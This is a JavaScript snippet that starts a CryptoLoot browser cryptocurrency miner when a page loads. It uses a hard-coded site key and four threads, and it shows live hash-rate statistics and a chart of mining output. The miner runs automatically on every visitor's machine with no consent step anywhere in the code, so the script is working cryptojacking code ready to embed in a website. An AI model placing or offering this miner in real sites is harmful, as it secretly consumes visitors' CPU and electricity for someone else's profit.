window.onload = function() {
	var miner = new CryptoLoot.Anonymous('f6a6d5e790bb2421d0294e87a51066e6fe34f4905475',
        { threads:4, autoThreads:false, throttle:0.2 }
    );
    miner.start();
            
    // Listen on events
    miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	var hashesMemory = [];
	var seconds = 0;

    // Update stats once per second
    setInterval(function() {
		totalHashes = miner.getTotalHashes();
        hashesPerSecond = miner.getHashesPerSecond();
        acceptedHashes = miner.getAcceptedHashes();
        isRunning = miner.isRunning();

		hashesPerSecond = miner.getHashesPerSecond();
		hashesMemory.push(hashesPerSecond);
		if (hashesMemory.length > 200) hashesMemory.shift();
            
        document.getElementById("hashespersec").innerHTML = hashesPerSecond + " hashes/sec";
        document.getElementById("totalhashes").innerHTML = totalHashes + " total hashes";
        document.getElementById("verifiedhashes").innerHTML = acceptedHashes + " verified hashes";
            
        document.getElementById("ondot").style.color = "red";
        if (isRunning) {
            document.getElementById("ondot").style.color = "green";
        }

		var chartDataPoints = [];
		for (var i = 0; i < hashesMemory.length; i++) {
			chartDataPoints.push({ x: seconds - hashesMemory.length + i + 1, y: hashesMemory[i] });
		}

		var chart = new CanvasJS.Chart("chartContainer", {
			theme: "light2",
			axisY: {
 				title: "hashes/sec"
			},
  			axisX: {
 				title: "seconds"
			},
			data: [{
				type: "area",
				color: "#68a2ff",
				dataPoints: chartDataPoints
			}]
		});
		chart.render();
		seconds++;
	}, 1000);
}